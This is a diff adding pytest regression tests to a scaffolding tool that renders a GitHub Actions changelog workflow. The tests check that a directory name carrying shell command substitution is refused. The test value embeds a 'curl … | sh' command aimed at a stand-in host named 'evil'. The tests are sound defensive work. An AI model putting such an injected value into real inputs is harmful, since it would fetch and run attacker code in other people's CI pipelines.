@@ -18,6 +18,8 @@ import subprocess
 import sys
 from pathlib import Path
 
+import pytest
+
 REPO_ROOT = Path(__file__).resolve().parent.parent
 sys.path.insert(0, str(REPO_ROOT / "scripts"))
 
@@ -45,6 +47,43 @@ def _config(**overrides):
 
 def test_there_are_owned_files():
     assert scaffold.OWNED, "no owned files -- every check below would vacuously pass"
+
+
+# ------------------------------------------ the directory name becomes shell source
+#
+# `changelog_dir` is substituted into the generated workflow's `run:` body. Nothing
+# validated it, so `news.d$(curl -s http://evil/x|sh)` rendered into a live command
+# substitution and was committed into somebody's repository to run in their CI (#31).
+# The refusal belongs in `validate()`, and it is repeated here because `render_owned()`
+# is reachable without ever calling `validate()`.
+
+HOSTILE_DIR = "news.d$(curl -s http://evil/x|sh)"
+
+
+def test_a_changelog_dir_carrying_a_substitution_never_reaches_a_generated_run_line():
+    with pytest.raises(scaffold.ScaffoldError) as refusal:
+        scaffold.render_owned(".github/workflows/oss-changelog.yml", _config(changelog_dir=HOSTILE_DIR))
+    assert "changelog_dir" in str(refusal.value)
+
+
+def test_the_whole_scaffold_refuses_a_changelog_dir_carrying_a_substitution(tmp_path):
+    with pytest.raises(scaffold.ScaffoldError):
+        scaffold.plan(tmp_path, _config(changelog_dir=HOSTILE_DIR))
+    with pytest.raises(scaffold.ScaffoldError):
+        scaffold.apply(tmp_path, _config(changelog_dir=HOSTILE_DIR), plugin_root=REPO_ROOT)
+    assert not (tmp_path / ".github").exists(), "the scaffold wrote files before refusing"
+
+
+def test_a_changelog_dir_that_is_not_a_string_is_refused_rather_than_crashing():
+    with pytest.raises(scaffold.ScaffoldError):
+        scaffold.render_owned(".github/workflows/oss-changelog.yml", _config(changelog_dir=17))
+
+
+def test_a_nested_changelog_directory_still_renders():
+    body = scaffold.render_owned(
+        ".github/workflows/oss-changelog.yml", _config(changelog_dir="docs/changelog.d")
+    )
+    assert "docs/changelog.d" in body
 
 
 # ------------------------------------------------- the workflow can run what it calls
